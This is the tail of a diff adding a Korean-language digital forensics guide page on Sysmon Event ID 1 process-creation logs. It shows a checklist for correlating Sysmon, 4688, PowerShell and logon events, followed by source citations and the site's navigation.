+<ol><li><code>ParentProcessGuid</code>로 이었는가 → PID로 이으면 틀린 부모가 붙는다</li><li><code>UtcTime</code>을 그대로 UTC로 썼는가 → 이중 변환하면 9시간이 틀어진다</li><li><code>OriginalFileName</code>을 비교했는가 → 이름 위장은 이 한 줄로 확정된다</li><li>Sysmon 기록 구간이 사건 시각을 포함하는가 → 7045로 설치 시각 확인</li><li>찾는 프로세스가 없는가 → 설정 제외 규칙 가능성. 4688과 대조</li><li>명령행에 base64가 있는가 → PowerShell 4104/4103으로 넘어간다</li><li>네트워크 행위가 필요한가 → 같은 <code>ProcessGuid</code>의 Sysmon 3</li><li>파일 드롭이 필요한가 → 같은 <code>ProcessGuid</code>의 Sysmon 11</li><li>세션·계정이 필요한가 → <code>LogonId</code>로 4624를 엮는다</li></ol>
+<h2 id="출처">출처</h2>
+<ul><li>SRC-024 — Microsoft Learn, Sysmon: Event ID 1 ProcessCreate의 필드 목록과 채널 이름, 설정 방식</li><li>SRC-021 — Microsoft Learn, Event 4688: 4688이 제공하는 필드 범위와 명령행 감사가 별도 설정임을 확인</li><li>SRC-086 — MITRE ATT&amp;CK Enterprise: 이름 위장(Masquerading), LOLBin 실행, 비정상 부모-자식 조합 등 탐지 관점</li><li>Sysmon의 기본 해시 알고리즘과 <code>ParentUser</code> 필드 존재 여부는 <strong>Sysmon 버전에 따라 다르다.</strong> 실제 이벤트의 필드 목록을 먼저 확인할 것</li><li><code>ProcessGuid</code>의 내부 인코딩(어떤 값이 어느 바이트에 들어가는지)은 공식적으로 문서화된 형식이 아니므로 이 글에서는 단정하지 않았다. 유일성 보장과 피벗 용도로만 사용할 것</li></ul>
+      </div>
+      <section class="related">
+  <h2>관련 글</h2>
+  <div class="related-grid">
+  <a class="related-item" href="./sysmon-event-3-network-connect.html">
+    <span class="rel-id">FOR-0100 · Event Log</span>
+    Sysmon Event ID 3 NetworkConnect: 프로세스와 통신을 잇는 유일한 로그
+  </a>
+  <a class="related-item" href="./sysmon-event-11-file-create.html">
+    <span class="rel-id">FOR-0101 · Event Log</span>
+    Sysmon Event ID 11 FileCreate: 누가 이 파일을 만들었는가
+  </a>
+  <a class="related-item" href="./event-4688-process-creation.html">
+    <span class="rel-id">FOR-0088 · Event Log</span>
+    Event ID 4688 프로세스 생성: CommandLine 과 부모-자식 체인 재구성
+  </a>
+  <a class="related-item" href="./sysmon-event-13-registry-set.html">
+    <span class="rel-id">FOR-0102 · Event Log</span>
+    Sysmon Event ID 13 RegistryEvent: 레지스트리를 바꾼 프로세스 특정
+  </a>
+  </div>
+</section>
+      <div class="pager">
+<a class="related-item" href="./powershell-4103-module-logging.html"><span class="rel-id">← FOR-0098</span>PowerShell 4103 모듈 로깅: ContextInfo와 Payload로 인자 값 복원</a>
+<a class="related-item" href="./sysmon-event-3-network-connect.html"><span class="rel-id">FOR-0100 →</span>Sysmon Event ID 3 NetworkConnect: 프로세스와 통신을 잇는 유일한 로그</a>
+      </div>
+    </article>
+<aside class="toc">
+  <div class="toc-title">목차</div>
+  <ul>
+<li class="toc-l2"><a href="#한-줄-결론">한 줄 결론</a></li>
+<li class="toc-l2"><a href="#어떤-문제에서-필요한가">어떤 문제에서 필요한가</a></li>
+<li class="toc-l2"><a href="#문제에서-처음-볼-단서">문제에서 처음 볼 단서</a></li>
+<li class="toc-l2"><a href="#30초-절차">30초 절차</a></li>
+<li class="toc-l2"><a href="#상세-절차">상세 절차</a></li>
+<li class="toc-l3"><a href="#1단계-필드-전수표">1단계 — 필드 전수표</a></li>
+<li class="toc-l3"><a href="#2단계-4688-대비-압도적인-이유">2단계 — 4688 대비 압도적인 이유</a></li>
+<li class="toc-l3"><a href="#3단계-processguid로-계보-복원">3단계 — ProcessGuid로 계보 복원</a></li>
+<li class="toc-l3"><a href="#4단계-originalfilename으로-이름-위장-확정">4단계 — OriginalFileName으로 이름 위장 확정</a></li>
+<li class="toc-l3"><a href="#5단계-integritylevel로-권한-상승-탐지">5단계 — IntegrityLevel로 권한 상승 탐지</a></li>
+<li class="toc-l3"><a href="#6단계-실전-필터">6단계 — 실전 필터</a></li>
+<li class="toc-l2"><a href="#출력-필드-해석">출력 필드 해석</a></li>
+<li class="toc-l2"><a href="#pivot-다음에-볼-artifact">pivot: 다음에 볼 artifact</a></li>
+<li class="toc-l2"><a href="#흔한-함정">흔한 함정</a></li>
+<li class="toc-l2"><a href="#교차검증">교차검증</a></li>
+<li class="toc-l2"><a href="#mini-walkthrough">mini walkthrough</a></li>
+<li class="toc-l2"><a href="#막혔을-때-다음-체크">막혔을 때 다음 체크</a></li>
+<li class="toc-l2"><a href="#출처">출처</a></li>
+  </ul>
+</aside>
+  </div>
+</main>
+<footer class="site-footer">
+  완전 오프라인 · 인터넷/CDN 없음 · build 2026-09-10 08:40 KST
+</footer>
+<script src="../assets/search-index.js"></script>
+<script src="../assets/search-core.js"></script>
+<script src="../assets/app.js"></script>
+</body>
+</html>
